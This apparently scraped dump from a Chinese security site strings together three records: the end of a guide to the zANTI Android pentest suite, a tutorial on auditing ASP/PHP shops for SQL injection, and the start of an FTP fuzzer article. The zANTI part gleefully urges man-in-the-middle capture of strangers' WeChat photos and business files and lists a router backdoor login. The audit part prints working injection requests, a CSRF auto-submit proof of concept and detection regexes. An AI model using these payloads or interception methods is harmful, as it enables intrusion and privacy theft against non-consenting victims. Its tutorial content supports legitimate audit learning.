重新扫描网络对于网络发生更改的WIFI或者对于新加入的一些设备，我们往往需要重新扫描网络发现新加入的的设备。这时的操作如下所示：3 WIFI监控器在这里，我们可以找到可用的WIF网络，并且可以看到相关WIF的MAC地址和信号频道。也可以直接输入WIFI的密码进行连接。4 设置在这里我们可以看到WIF设置，可以直接调用WIF设置，WIFI策略、一般选项、扫描选项等等设置，熟悉这些设置对于我们灵活进行网络渗透测试极有帮助。0×03 攻击目标zANTI 是 Android 平台下另外一款最知名的渗透测试套件之一。使用该套件，用户可以很方便的在 Android 下实施各种常见的渗透测试工作，如密码攻击、漏洞探测、中间人攻击（图片替换、拦截客户端请求和下载的文件等1 扫描整个网段当我们连接某个WIFI的时候，我们可以直接扫描整个网段，如果整个网段的终端比较多，扫描的时间可能需要10-30分钟，大家要耐心等候。并且手机尽量保持满电状态，因为扫描需要消耗很多电量。2 合作行动-扫描当我们完成了扫描整个网段，这时我们会得到一系列的IP（这里的IP指对应的终端移动设备），这时我们可以选择其中一个IP，发动进一步的攻击。这时我们点击某个IP，进行如下界面，从上图，我们可以看到【合作行动】中有一个选项【扫描】，这时我们可以对目标IP进行深一步的扫描动作，这个扫描动作非常强大，集合了NMAP的各种扫描功能，甚至也包含了NMAP的NSE脚本扫描功能，使用NMAP的NSE脚本进行各种服务漏洞的扫描，甚至更进一步进行漏洞攻击，因为NSE中有500多种脚本检测和攻击。 2 合作行动-连接至远程端口在这个动作中，我们如果扫描到类似telnet、ssh、MySQL、路由器管理界面等等相应的端口和服务，这时我们就可以尝试连接上这些服务。此外，还可以自己添加端口和服务，这个就可以满足当某个服务不是使用常规端口时的需求以及一些其他服务及其对应端口。 3 密码复杂度审计这个功能可以帮助我们对扫描出来的常见协议和服务进行暴力破解，可以使用各种字典，例如小字典，优化后的字典，大字典、巨型字典，甚至也支持自定义字典，这个功能实在贴心服务。因为在进行企业内部无线审计的时候，往往会根据企业内部的弱密码规律进行收集一些字典。这时就可以进行个性化的密码复制都审计了。4 中间人攻击   不得不说，这个是zANTI最强大的功能，真正意义上的黑客。这个中间人攻击对欺骗的手机端实现了记录请求、记录图像、zpacketEditor、SSL strip、重新导向HTTP、替代图片、获取下载、截获下载、插入HTML等一系列强大的功能。对于受害者的上网请求和图片和下载的文件一一截获。举例：一个妹子在微信上给A同学发送了一张相片(是啥相片，大伙自由想象），然后B同学使用了这个中间人欺骗，截获了这图片。你们猜猜，那感觉多美好啊。再举一个例子：某个商业客户C把商业文件通过这个WIFI发送公司职业D，刚刚好在同一个WIFI下，有个安全爱好者F使用了中间人欺骗，一不小心把这个商业文件给中间截获了，看到了里面客户信息（姓名、手机号码、报价、订单等等）。哈哈哈①已记录的请求从上图，我们可以看到有些是微信的请求，有些是浏览器的请求。可以想象受害者在流量哪些网站，我们一目了然。如果是浏览了XXX网站，我们也可以获取到一些网站地址，收藏着以后慢慢看，哈哈。例如某些公司内部网站或者是一些登录界面管理后台等等。至于还有什么网站，大伙自己猜猜，哈哈②已记录的图像从对方的手机从可以截获各种图片，例如别人在浏览朋友圈，如果朋友圈是有很多相片的，那么我们在这里也可以截获到这些相片。再如在公共场合连接WIFI时，我们可以截获特定用户的相片，尤其是这些相片是保存了账号和密码的时候。当然有些相片是截获不到的。例如GIF等动态图 ③ zPacketEditor互动模式，允许修改每个单独的HTTP请求，并在他们通过设备时回复。使用这个功能可以直接重放对方的浏览请求，这个对于类似的短信炸弹或者接口调用函数这些很有好处。④替代图片这个功能可以让我们选择任意图片，开启这个功能后，对方手机上的HTTP页面上的所有图片都会被一张图片替代，这张图片可以任意选择。至于怎样恶搞，大伙可以自由发挥，哈哈。此外有很多功能等待我们去探索，例如HTTP服务器，HTTP重定向等等。ssl 攻击等等。并且以及把这个东西应用在各种场合达到各种目的，是在太邪恶了。哈哈。 0X04 Routerpwn.com当用户成功连接到一个 WiFi 网络后，可以利用路由器中存在的漏洞进行攻击，从而控制其路由器。在 zANTI 工具中，提供了一个常见路由器的漏洞网站——Routerpwn.com。用户可以通过查询该网站，找出其路由器中存在的漏洞，并进行渗透攻击来控制其路由器。用户可以使用两种方法打开路由器漏洞网站。第一种，是在浏览器地址栏中直接输入 http://routerpwn.com/。第二种，是在 zANTI 工具的网络任务选项列表中单击 Routerpwn.com 选项，即可打开该网站，如图 所示上就是路由器漏洞网站的主页面。从该界面可以看到，包括很多类路由器，如常见的 HUAWEI、TP-LINK、Zoom、D-Link 等。在该界面选择任何一类型路由器，即可查看存在的漏洞信息。例如，查看 TP-LINK 路由器中存在的漏洞。Category）、源地址（Source）、标题（Title）和创始人（Author）。如果想查看漏洞的详细信息，则单击 Source 列的地址查看。从该界面显示的最后一个漏洞，可以看到该路由器存在Webshell 后门。其中，用户名为 osteam，密码为 5up。所以，用户可以尝试使用该用户名和密码登录路由器的 Webshell。这个是非常实用的功能库，可以说是一个无线设备的漏洞库，实在做得不错。大大赞一个。","2016-09-23 17:42:08","安全工具","Android平台渗透测试套件zANTI v2.5发布（含详细说明）","http://nsoad.com/Security-tools/20160923/tools-436.html"
"5ccbfa9e4f2f0a0a7a69c096","由浅入深教你学会源代码审计系列（一）","silence","作者：hac425稿费：500RMB（不服你也来投稿啊！）投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿 代码审计总论安全圈里有句老话：一切的用户输入都是有害的。的确，我们的所有安全测试都是基于这一点的。既然用户的一切输入都是有害的，那么怎样使这个危害显现出来呢？这就引入了安全的另一句话：有害的数据进入了危险的函数便产生了漏洞 ，因此我们可以总结出安全的两个基本点，数据和函数，我们所做的所有安全相关的工作都是基于这两点。代码审计自然也不例外。 根据这两点，代码审计中又出现了两大审计的基本方法，分别是1. 跟踪用户的输入数据，判断数据进入的每一个代码逻辑是否有可利用的点，此处的代码逻辑可以是一个函数，或者是条小小的条件判断语句。2. 根据不同编程语言的特性，及其历史上经常产生漏洞的一些函数，功能，把这些点找出来，在分析函数调用时的参数，如果参数是用户可控，就很有可能引发安全漏洞这两种方法各有所长，使用第一种方法我们能最大限度的找到程序的安全漏洞，但是跟踪数据的走向是一件工作量极大的事情，如果想跟一套程序死磕，此法 极好，因为在跟踪变量的时候，就是对程序的一个理解的过程，跟的越多，我们走过的 程序流程就越多，对程序的理解就会越深厚，对程序理解的越深，就越有可能挖掘出精彩的漏洞。 第二种方法的优点就是我们能够尽快的找到安全漏洞，但是由于我们没有跟踪完所有的用户参数，我们就必定会有所疏漏，不可能找到程序的所有漏洞，同时回溯参 数，寻找函数的调用点，在一些情况下也是一件非常头疼的事情，不过相比第一种方法我们工作量还是少了不少。总而言之，我们想要快速的找到漏洞，需要灵活的 使用两种方法，怎么灵活，这就要靠经验了，最后提一句，这东西入门后就是体力活了。。。。。审计辅助工具：sublime 一款十分好用的编辑器 匹配规则 搜索函数 简单的跟踪变量 各种对应编程语言的 IDE 用于调试程序，追踪变量 真正寻找漏洞之前     现在的cms大致可分为两种，单入口模式和多入口模式.所谓多入口模式cms在前几年是一种非常常见的程序设计模式，它的形式是我们使用程序的每一个功能都需要访问不同的文件，比如：我要使用注册功能就要访问regest.php文件，使用评论功能就要访问comment.php，这种模式的程序在现在来说，在asp的cms中居多，php中已经很罕见了。单入口模式的cms，是伴随着一种叫做MVC的开发模式出来的，这种模式我在这简单提一下 ，所谓MVC编程架构，即将 程序分为三个层次，分别实现三大功能数据以何种形式展示给用户程序的具体实现逻辑数据的处理而我们审计的重点应该在数据的处理层，因为我们之前我已经说过，用户的有害输入加上合适的函数就形成了漏洞 ，而数据处理层恰好就是处理我们输入数据的一个层次。由于这种编程模式拥有很多优点，现在大量的程序采用了这种编程模式，因此如果我们要审计这类程序，也必须要熟悉这种开发模式，至于怎么熟悉，请自行百度。单入口模式程序的特点是，我们要使用程序的每一个功能只需要访问一个，或者两个文件 普通用户一个入口文件 、管理员一个入口文件 ,要调用其他的文件中的具体的功能实现代码，我们只需向该入口文件提供特定的参数即可。这种 cms 的案例有很多，比如 wordpress,phpcms......在审计代码时，审计多入口模式的程序会相对的比较简单，因为我们在找到漏洞后可以很快的找到进入漏洞的代码的方法，而单入口模式的程序，在正式审计之前，我们还需要理解程序各个文件之间的调用规则，当然这也是一件比较简单的事情，一般情况下，我们从入口文件跟一次程序的执行流程，就能基本理清程序的流程，其实在有了一定的经验之后，我们就能从参数的值猜出程序的执行流程。在理清程序的各个文件之间的调用关系之后，我们需要做的是，查看程序的一些配置文件，全局函数文件，这些文件里面很可能包含一定的过滤函数，能早一点发现 程序对参数的处理过程，我们就能及时地确定一些无法利用的漏洞点，这可以有助于减少我们的工作量。搞完这些工作之后，就开始进入具体漏洞搜寻工作。就像前 面说的那样，我们在进行漏洞搜寻时，我们有两种方式:第一种，我们通过搜索一些获取用户输入数据的函数，来找到用户输入数据的源头，之后我们从这里为起 点，跟踪数据的流向，分析在这整个过程中数据的处理情况，进而定位可能触发漏洞的点。第二种，我们通过搜索一些经常产生安全问题的函数，比如执行数 据库查询的函数，执行系统命令的函数，文件操作类函数等等，在通过回溯这些函数在被调用时参数，判断参数是否我们可控，进而定位漏洞点。最后贴上我常用的正则：PHP\$_SERVER|\$_COOKIE|\$_REQUEST|\$_GET|\$_POST    获取用户输入eval\(|assert\(|system\(                         命令执行require\(|require_once\(|include\(|include_once\(                     文件包含file_get_contents\(|file\(|fopen\(|highlight_file\(|show_source\(|unlink      文件读取，写入，删除simplexml_load_string                          XXEunserialize                                   反序列化漏洞SP 的话，因为程序的流程相对比较简单，代码量也比较少，所以我一般选择直接跟变量，我就搜索 Request 关键字就能找到所有的数据输入点.NET  搞的很少 ，而且这一类程序往往需要反编译才能继续审计，因此对于这种程序，我没有什么好方法，我是一个一个函数去看的，如果各位有一些好的方法，敬请告知，谢谢。jsp 没搞过。。。。 一、代码审计之SQL注入篇在我们的日常日站中，相信SQL 注入漏洞是我们遇到最多，也可能是最希望遇到的一种漏洞了，这种漏洞出现了很久，危害也是十分巨大，具体危害就不多说了，相信大家都懂。。。我们大多数时候发现SQL注入漏洞是通过扫描器等黑盒测试手法来发现的，今天我来谈谈SQL注入漏洞的白盒审计手法。首先我们从一个相对比较简单的 asp 程序开始讲，这次讲的是shop7z这套cms，该cms 是一个 多入口 的程序，也就是说它的每一个大的功能基本对应一个URL，我个人认为这样的程序是比较简单的，因为当我们找了可能触发的漏洞点后，就可以很快的进行验证，不需要太多的前期准备工作。既然是asp程序，我的一般做法是 直接搜索 request来找到我们用户所有可控的输入点。当然在此之前，我们还需要看看各个文件的开头，确定一些被多次的包含的文件，这些文件一般就是一些全局配置文件，全局函数文件，安全过滤文件。总而言之就是一些相对来说比较重要的文件。通过查看shop7z这套程序的一些从名称上看比较重要的文件，我发现了一个比较有趣的文件：shop7z_safe.asp从文件名我们就能够猜出来，这个文件就是拿来，对用户参数进行过滤的，那我们进入文件中看看：A&lt;%Dim Fy_Post,Fy_Get,Fy_In,Fy_Inf,Fy_Xh,Fy_db,Fy_dbstr'自定义需要过滤的字串,用 ""曹"" 分隔 ' 防止SQL注入以及XSS跨站攻击 /2016/1/3Fy_In = ""'曹;曹and曹exec曹insert曹select曹delete曹count曹*曹%曹chr曹mid曹master曹truncate曹char曹declare曹&lt;曹&gt;曹script""'----------------------------------%&gt;&lt;%Fy_Inf = split(Fy_In,""曹"")'--------POST部份------------------If Request.Form&lt;&gt;"""" ThenFor Each Fy_Post In Request.FormFor Fy_Xh=0 To Ubound(Fy_Inf)If Instr(LCase(Request.FormFy_Post)),Fy_Inf(Fy_Xh))&lt;&gt;0 Then(Response.Write ""xxx&lt;script Language=JavaScript&gt;('请不要对本站尝试进行非法操作谢谢合作^_^ ');history.go(-1);&lt;/script&gt;""Response.EndEnd IfNextNextEnd If'----------------------------------'--------GET部份-------------------If Request.QueryString&lt;&gt;"""" ThenFor Each Fy_Get In Request.QueryStringFor Fy_Xh=0 To Ubound(Fy_Inf)If Instr(LCase(Request.QueryString(Fy_Get)),Fy_Inf(Fy_Xh))&lt;&gt;0 ThenResponse.Write ""xxx&lt;script Language=JavaScript&gt;('请不要对本站尝试进行注入操作谢谢合作^_^ ');history.go(-1);&lt;/script&gt;""Response.EndEnd IfNextNextEnd If%&gt;可以看到，的确如我所料，这个文件就是拿来对我们的参数进行过滤的，不过这个过滤策略是很有问题的，首先这个过滤文件只是针对 SQL 注入攻击进行了过滤，而对其他漏洞，如 xss ，还有一个更大的问题，就是它只对 GET ,POST 参数进行了过滤，而忽视从 cookie 中过来的参数，这就很有可能会造成 cookie 注入。理解了程序对用户参数的过滤操作，你是否感到目标更加的明确，通过上面的分析我们可以制定这样的审计策略。通过使用 sublime 的文件搜索功能，搜索  request 来获取用户的输入点，因为在 asp 程序中获取用户输入，使用的几个函数及其作用分别为： request.QueryString（获取GET请求的参数) request.form() (获取POST请求的参数) request.cookie() (获取通过cookie传来的参数  request )  所以我们要找 SQL 注入漏洞的话，我们应该关注的输入点函数就是 能从 cookie中获取参数的函数，有了思路，就可以开始行动了，我们开始搜索，之后一个一个的跟进每一个搜索结果，我们就能发现 N 处注入了下面我选择一处来说明下吧：漏洞文件： news.asp：searchkey=request(""searchkey"")searchkind=request(""searchkind"")if searchkey&lt;&gt;"""" then    sql3=""select * from e_contect where c_parent2=""&amp;request.QueryString(""l_id"")&amp;"" and (c_title like '%""&amp;searchkey&amp;""%' or c_contect like '%""&amp;searchkey&amp;""%') order by c_num desc,c_addtime desc""else    sql3=""select * from e_contect where c_parent2=""&amp;request.QueryString(""l_id"")&amp;"" order by c_num desc,c_addtime desc""end ifset rs3=server.CreateObject(""adodb.recordset"")rs3.open sql3,conn,1,1虽然该文件也包含了，全局过滤文件，但是这里用了 request() 函数来获取参数，那么我们就能通过 cookie 来传输参数值，而 cookie 中的值是没有经过过滤的，所以出现了注入，当我提交：GET /news.asp?l_id=1 HTTP/1.1Host: 127.0.0.1:99Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: _ga=GA1.1.1929133354.1465629589; COSPTLCBWXNQVBUKXIOJ=KSBKFPQVGIRJWBOELVYRTMRCNPDSIWYDIWYHQYNQ; searchkey=sss'and#执行的语句是：select * from e_contect where c_parent2=1 and (c_title like '%sss'and#%' or c_contect like '%sss'and#%') order by c_num desc,c_addtime desc成功带入了查询，，，下面我们来看一套 单入口 模式的 php 程序，这套 cms 的名称为 乐尚商城cms,这是一套典型的采用 MVC 编程模型编写的程序，而且它还将 URL 路由进行了重写，也就是说他的 URL 如果按照国际标准去解析他，是没有什么实际意义的，所以遇到这种程序，我们还需要理清它 URL 路由规则，找到参数名，与参数值的位置关系。我们先来看看他的 URL 到底是怎样的：前台：后台：下面我们来看看他的目录结构，单入口的程序一般都采用类似这样的目录结构来编写，接着查看 index.php 文件，分析一下程序的执行流程，既然是单入口程序，那么程序的各个文件之间的调用关系必定都会在再 index.php 文件内实现。我们要理清程序的执行流程，这一步是必不可少的。<!--?php    /**     * 单一入口文件     */    include(""./temp.inc.php"");    define(""TPLSTYLE"", $temp['template']);//默认模板存放的目录    define(""BROPHP"", ""./brophp"");  //框架源文件的位置    define(""APP"", ""./home"");   //设置当前应用的目录    define(""PAGENUM"",$temp['home_page_num']); //默认每页显示记录数    if(!file_exists(""install/install_lock.txt"")){        header(""Location:install/index.php"");        exit();    }    if(is_mobile_request()){        header(""Location:mobile.php"");    }    require(BROPHP.'/brophp.php'); //加载框架的入口文件    function is_mobile_request()      {          .......................    }?-->该文件开始包含了一个 temp.inc.php ，经分析，该文件内就是定义了一些变量，对我们而言并没有什么用，接下来又定义了一些常量，之后 require(BROPHP.'/brophp.php') 包含了一个文件，看注释可知这个文件应该就是一个比较关键的文件了，而且， index.php 文件后面已经没有什么内容了，所以调度整个程序的重担应该就在 brophp.php 文件内了，该文件内的一些关键代码：/包含框架中的函数库文件    include BROPHP_PATH.'commons/functions.inc.php';    //包含全局的函数库文件，用户可以自己定义函数在这个文件中    $funfile=PROJECT_PATH.""commons/functions.inc.php"";    if(file_exists($funfile))        include $funfile;    //设置包含目录（类所在的全部目录）,  PATH_SEPARATOR 分隔符号 Linux(:) Windows(;)    $include_path=get_include_path(); //原基目录    $include_path.=PATH_SEPARATOR.BROPHP_PATH.""bases/"";   //框架中基类所在的目录    $include_path.=PATH_SEPARATOR.BROPHP_PATH.""classes/"" ;//框架中扩展类的目录    $include_path.=PATH_SEPARATOR.BROPHP_PATH.""libs/"" ;   //模板Smarty所在的目录    $include_path.=PATH_SEPARATOR.PROJECT_PATH.""classes/"";//项目中用的到的工具类    $controlerpath=PROJECT_PATH.""runtime/controls/"".TMPPATH;  //生成控制器所在的路径    $include_path.=PATH_SEPARATOR.$controlerpath; //当前应用的控制类所在的目录     //设置include包含文件所在的所有目录        set_include_path($include_path);    //自动加载类         function __autoload($className){        if($className==""memcache""){//如果是系统的Memcache类则不包含            return;        }else if($className==""Smarty""){//如果类名是Smarty类，则直接包含            include ""Smarty.class.php"";        }else{ //如果是其他类，将类名转为小写            include strtolower($className)."".class.php"";            }        Debug::addmsg("" $className 类"", 1);  //在debug中显示自动包含的类    }这里首先包含了 functions.inc.php 文件，该文件内部是一些全局函数，之后设置了许多的目录， 使用set_include_path($include_path) ，将这些目录下的文件全部包含进来，逐个点进去看看，发现了定义路由的文件是 brophp/bases/prourl.class.php 看看文件内容：<!--?php    class Prourl {        /**         * URL路由,转为PATHINFO的格式         */         static function parseUrl(){            if (isset($_SERVER['PATH_INFO'])){                   //获取 pathinfo                $pathinfo = explode('/', trim($_SERVER['PATH_INFO'], ""/""));                   // 获取 control                   $_GET['m'] = (!empty($pathinfo[0]) ? $pathinfo[0] : 'index');                   array_shift($pathinfo); //将数组开头的单元移出数组                    // 获取 action                   $_GET['a'] = (!empty($pathinfo[0]) ? $pathinfo[0] : 'index');                array_shift($pathinfo); //再将将数组开头的单元移出数组                 for($i=0; $i<count($pathinfo); $i+=2){                    $_GET[$pathinfo[$i]]=$pathinfo[$i+1];                }            }else{                    $_GET[""m""]= (!empty($_GET['m']) ? $_GET['m']: 'index');//默认是index模块                $_GET[""a""]= (!empty($_GET['a']) ? $_GET['a'] : 'index');   //默认是index动作                if($_SERVER[""QUERY_STRING""]){                    $m=$_GET[""m""];                    unset($_GET[""m""]);  //去除数组中的m                    $a=$_GET[""a""];                    unset($_GET[""a""]);  //去除数组中的a                    $query=http_build_query($_GET);   //形成0=foo&1=bar&2=baz&3=boom&cow=milk格式                    //组成新的URL                    $url=$_SERVER[""SCRIPT_NAME""].""/{$m}/{$a}/"".str_replace(array(""&"",""=""), ""/"", $query);                    header(""Location:"".$url);                }                }        }    }这段代码将我们的 URL 进行了处理，当我们请求这样的 URL时http://localhost/leshang/index.php/product/index/id/32/pid/0/m_id/31经过这样一段代码的处理后的效果是，$_GET['m']= product   $_GET['a'] = index    $_GET['id'] = 32   $_GET['pid'] = 0$_GET['m_id'] = 3通过分析，我们直接按照标准的形式提交参数上去也是可以的，下面的 URL 和上面的 URL是一样的http://localhost/leshang/index.php?m=product&amp;a=index&amp;id=32&amp;pid=0&amp;m_id=31所以遇到 URL 重写也无需慌张，仔细分析程序即可。之后继续分析 brophp.php 文件，我们还可以发现，程序没有对我们的参数进行过滤，接下了就上正则搜索了\$_SERVER|\$_COOKIE|\$_REQUEST|\$_GET|\$_POST逐个分析，就能找到漏洞点，我把我的分析就给贴一下吧,其中一个漏洞文件： admin/controls/acate.class.php漏洞代码：function del(){            $acate=D(""acate"");            if($_POST['dels']){                if($acate-&gt;delete($_POST['id'])){                    $this-&gt;clear_cache();                    $this-&gt;success(""删除成功!"", 1, ""acate/index"");                } else {                    $this-&gt;error(""删除失败!"", 1, ""acate/index"");                }            } else {                if($acate-&gt;delete($_GET['id'])){                    $this-&gt;clear_cache();                    $this-&gt;success(""删除成功!"", 1, ""acate/index"");                } else {                    $this-&gt;error(""删除失败!"", 1, ""acate/index"");                }            }        } 这里直接将 $_POST['id'] 传入了 delete 函数，我们来看看该函数的具体实现，function delete(){            $where="""";            $data=array();            $args=func_get_args(); //获取参数            if(count($args)&gt;0){                $where = $this-&gt;comWhere($args); //传参 构造 where 语句                $data=$where[""data""];                $where= $where[""where""];            }else if($this-&gt;sql[""where""] != """"){                $where=$this-&gt;comWhere($this-&gt;sql[""where""]);                $data=$where[""data""];                $where=$where[""where""];            }            $order = $this-&gt;sql[""order""] != """" ?  "" ORDER BY {$this-&gt;sql[""order""][0]}"" : """";            $limit = $this-&gt;sql[""limit""] != """" ? $this-&gt;comLimit($this-&gt;sql[""limit""]) : """";            if($where=="""" &amp;&amp; $limit==""""){                $where="" where {$this-&gt;fieldList[""pri""]}=''"";            }            $sql=""DELETE FROM {$this-&gt;tabName}{$where}{$order}{$limit}"";            return $this-&gt;query($sql, __METHOD__,$data);        }在进入 comWhere 函数，漏洞关键代码如下：private function comWhere($args){            $where="" WHERE "";            $data=array();            if(empty($args))                return array(""where""=&gt;"""", ""data""=&gt;$data);            foreach($args as $option) {                if(empty($option)){                    $where = ''; //条件为空，返回空字符串；如'',0,false 返回： '' //5                    continue;                }                else if(is_string($option))                {                        if (is_numeric($option[0])) {                        $option = explode(',', $option); //3                        $where .= ""{$this-&gt;fieldList[""pri""]} IN("" . implode(',', array_fill(0, count($option), '?')) . "")"";                        $data=$option;                        continue;                    }                     else                     {当 `$args` 的一个元素的值 为字符串时，就会直接并入 where 子句                $where .= $option; //2                        continue;                    }                    }                .........................                ..............................            $where=rtrim($where, ""OR "");            return array(""where""=&gt;$where, ""data""=&gt;$data);当 $args 的一个元素的值 为字符串时，就会直接并入 where 子句，之后返回。 这样，数据的来源没有过滤，处理过程也没过滤，造成了注入。 同时这里依旧存在 CSRF 漏洞。下面我的测试 POC   &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;访问后，执行的 SQL 语句为：DELETE FROM ls_acate WHERE jinyu'该漏洞发生在 del 函数中，而且有很多文件都是直接复制了该函数，所以使用了该函数的都。。。。。。 下面我搜到的一部分admin/controls/acate.class.phpadmin/controls/admin.class.phpadmin/controls/admingroup.class.phpadmin/controls/appraise.class.phpadmin/controls/brand.class.php                comment.class.php                consult.class.php                express.class.php                ........上面的注入需要管理员权限，下面就不需要任何权限了。。漏洞文件 ： home/controls/user.class.php关键代码：function del_consult(){        $consult=D(""Consult"");        if($_GET['id']){            if($consult-&gt;delete($_GET['id'])){                $this-&gt;success(""删除成功!"", 1);            } else {                $this-&gt;error(""删除失败!"", 1);            }        }     }这里和上面的也差不多， delete($_GET['id']) 将 id 参数带入了漏洞函数，造成注入。。提交 http://localhost/lesh/index.php/user/del_consult?id=jinyu'执行的语句：DELETE FROM ls_consult WHERE jinyu'同样的复制了该函数的都有漏洞。。。为了文章知识的完整性,下面来看一个 二次注入 的例子，来源 http://www.wooyun.org/bugs/wooyun-2010-0141461PHPSHE 二次注入一枚case 'register':        if (isset($_p_pesubmit)) {            if($db-&gt;pe_num('user', array('user_name'=&gt;pe_dbhold($_g_user_name)))) pe_error('用户名已存在...');            if($db-&gt;pe_num('user', array('user_email'=&gt;pe_dbhold($_g_user_email)))) pe_error('邮箱已存在...');            if (strtolower($_s_authcode) != strtolower($_p_authcode)) pe_error('验证码错误');            $sql_set['user_name'] = $_p_user_name;            $sql_set['user_pw'] = md5($_p_user_pw);            $sql_set['user_email'] = $_p_user_email;            $sql_set['user_ip'] = pe_ip();            $sql_set['user_atime'] = $sql_set['user_ltime'] = time();            if ($user_id = $db-&gt;pe_insert('user', pe_dbhold($sql_set))) {                add_pointlog($user_id, 'reg', $cache_setting['point_reg'], '注册帐号');                $info = $db-&gt;pe_select('user', array('user_id'=&gt;$user_id));                $_SESSION['user_idtoken'] = md5($info['user_id'].$pe['host_root']);                $_SESSION['user_id'] = $info['user_id'];                $_SESSION['user_name'] = $info['user_name'];                $_SESSION['pe_token'] = pe_token_set($_SESSION['user_idtoken']);                //未登录时的购物车列表入库                if (is_array($cart_list = unserialize($_c_cart_list))) {                    foreach ($cart_list as $k =&gt; $v) {                        $cart_info['cart_atime'] = time();                        $cart_info['product_id'] = $k;                        $cart_info['product_num'] = $v['product_num'];                        $cart_info['user_id'] = $info['user_id'];                        $db-&gt;pe_insert('cart', pe_dbhold($cart_info));用户注册时 ，进行了转义，然后登入时将完整的值带入了sessioncase 'login':        if (isset($_p_pesubmit)) {            $sql_set['user_name'] = $_p_user_name;            $sql_set['user_pw'] = md5($_p_user_pw);            if (strtolower($_s_authcode) != strtolower($_p_authcode)) pe_error('验证码错误');            if ($info = $db-&gt;pe_select('user', pe_dbhold($sql_set))) {                $db-&gt;pe_update('user', array('user_id'=&gt;$info['user_id']), array('user_ltime'=&gt;time()));                if (!$db-&gt;pe_num('pointlog', "" and `user_id` = '{$info['user_id']}' and `pointlog_type` = 'reg' and `pointlog_text` = '登录帐号' and `pointlog_atime` &gt;= '"".strtotime(date('Y-m-d')).""'"")) {                    add_pointlog($info['user_id'], 'reg', $cache_setting['point_login'], '登录帐号');                                }                $_SESSION['user_idtoken'] = md5($info['user_id'].$pe['host_root']);                $_SESSION['user_id'] = $info['user_id'];                $_SESSION['user_name'] = $info['user_name'];z  module/index/order.php 出库case 'comment':        $order_id = pe_dbhold($_g_id);        $info = $db-&gt;pe_select('order', array('order_id'=&gt;$order_id, 'user_id'=&gt;$_s_user_id));        if (!$info['order_id']) pe_error('参数错误...');        $info_list = $db-&gt;pe_selectall('orderdata', array('order_id'=&gt;$order_id));        if (isset($_p_pesubmit)) {            pe_token_match();            if ($info['order_comment']) pe_error('请勿重复评价...');            foreach ($info_list as $k=&gt;$v) {                $sql_set[$k]['comment_star'] = intval($_p_comment_star[$v['product_id']]);                $sql_set[$k]['comment_text'] = pe_dbhold($_p_comment_text[$v['product_id']]);                $sql_set[$k]['comment_atime']= time();                $sql_set[$k]['product_id'] = $v['product_id'];                $sql_set[$k]['order_id'] = $order_id;                $sql_set[$k]['user_ip'] = pe_dbhold(pe_ip());                $sql_set[$k]['user_id'] = $_s_user_id;                $sql_set[$k]['user_name'] = $_s_user_name;                if (!$sql_set[$k]['comment_text']) pe_error('评价内容必须填写...');            }            if ($db-&gt;pe_insert('comment', $sql_set)) {                order_callback('comment', $order_id);                pe_success('评价成功!');zmodule/index/order.php 出库      case 'comment':                 $order_id = pe_dbhold($_g_id);                 $info = $db-&gt;pe_select('order', array('order_id'=&gt;$order_id, 'user_id'=&gt;$_s_user_id));                 if (!$info['order_id']) pe_error('参数错误...');                 $info_list = $db-&gt;pe_selectall('orderdata', array('order_id'=&gt;$order_id));                 if (isset($_p_pesubmit)) {                     pe_token_match();                     if ($info['order_comment']) pe_error('请勿重复评价...');                     foreach ($info_list as $k=&gt;$v) {                         $sql_set[$k]['comment_star'] = intval($_p_comment_star[$v['product_id']]);                         $sql_set[$k]['comment_text'] = pe_dbhold($_p_comment_text[$v['product_id']]);                         $sql_set[$k]['comment_atime']= time();                         $sql_set[$k]['product_id'] = $v['product_id'];                         $sql_set[$k]['order_id'] = $order_id;                         $sql_set[$k]['user_ip'] = pe_dbhold(pe_ip());                         $sql_set[$k]['user_id'] = $_s_user_id;                         $sql_set[$k]['user_name'] = $_s_user_name;                         if (!$sql_set[$k]['comment_text']) pe_error('评价内容必须填写...');                     }                     if ($db-&gt;pe_insert('comment', $sql_set)) {                         order_callback('comment', $order_id);                         pe_success('评价成功!');我们注册个用户 aaaaaaa' ,购买商品后评价，可以看到 单引号带入了。","2016-09-13 14:04:25","Web安全","由浅入深教你学会源代码审计系列（一）","http://nsoad.com/Article/web/20160913/390.html"
"5ccbfa9e4f2f0a0a7a69c097","本文旨在通过python以及C#构造用户能够自定义，添加或者修改挖掘规则的ftp fuzzer。","silence","0x00 介绍本文旨在通过python以及C#构造用户能够自定义，添加或者修改挖掘规则的ftp fuzzer。  现在很多的ftp fuzzer已经由开发者自定义了内部挖掘规则。如果需要加入新的挖掘规则，用户除了自己写一个挖掘器，是否还有其它方法呢？  实现方式：由ftp fuzzer提供接口，用户按照自己的想法写出相应的挖掘规则。环境:WIn8 vs2013 + python + ironPython 0x01 详概ftp相关知识这里不介绍，大家可以去看看官方文档。程序整体的界面用c#开发，其中ironPython是为了实现在c#环境下运行python脚本。用python的原因主要基于：1.用户可以专注于挖掘规则的编写，不需要关注界面，以及数据处理问题。2.python简单，快捷，学习进度快。  在C#中调用python文件需要用到ironPython技术。相关资料读者可自行查阅，这里就不过多介绍了。  相关的调用方式：//c#中调用python脚本using IronPython.Hosting;.......ScriptRuntime pyRuntime = Python.CreateRuntime();dynamic obj = pyRuntime.UseFile(""fuzz.py""); //创建python脚本对象 使用方法：obj.function()fuzz.py文件包含各种测试命令，脏数据，以及规则。这些都可以由用户修改，添加。C#调用fuuz.py文件中的函数向ftp服务器发送各种脏数据。  测试之前我们肯定也要看ftp服务是否打开，这里我们用一个简单的函数完成。 def login(ip, port, username, password):    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    try:        connect = s.connect((ip, port))        s.recv(1024)        s.send(""user "" + username + ""\r\n"")        s.recv(1024)        s.send(""PASS "" + password + ""\r\n"")        s.recv(1024)        s.close()        return True;    except:        s.close()        return False;介绍程序之前我们首先看一下当前常用ftp fuzzer是如何对程序进行测试的。   buffer = 50*'A's.send(fuzzcmd[attr] + "" "" + buffer * 5 + '\r\n')        s.send(fuzzcmd[attr] + "" "" + buffer * 20 + '\r\n')        s.send(fuzzcmd[attr] + "" "" + buffer * 40 + '\r\n')        s.send(fuzzcmd[attr] + "" "" + buffer * 100 + '\r\n')        